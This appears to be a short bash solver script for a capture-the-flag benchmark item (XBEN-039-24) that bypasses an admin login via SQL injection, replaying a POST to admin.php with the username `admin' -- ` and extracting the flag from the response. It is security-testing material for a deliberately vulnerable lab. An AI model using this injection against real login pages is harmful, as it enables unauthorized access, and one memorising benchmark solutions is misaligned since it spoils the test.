#!/usr/bin/env bash
# XBEN-039-24 — login SQL injection. Proxy-mode twin. The admin login builds its
# query by string-concatenation, so `admin' -- ` comments the password check out
# and authenticates; the page it returns carries the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben039p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/admin.php"
BASE="$(req_of GET admin.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set "form.username=admin' -- " --set 'form.password=anything' \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
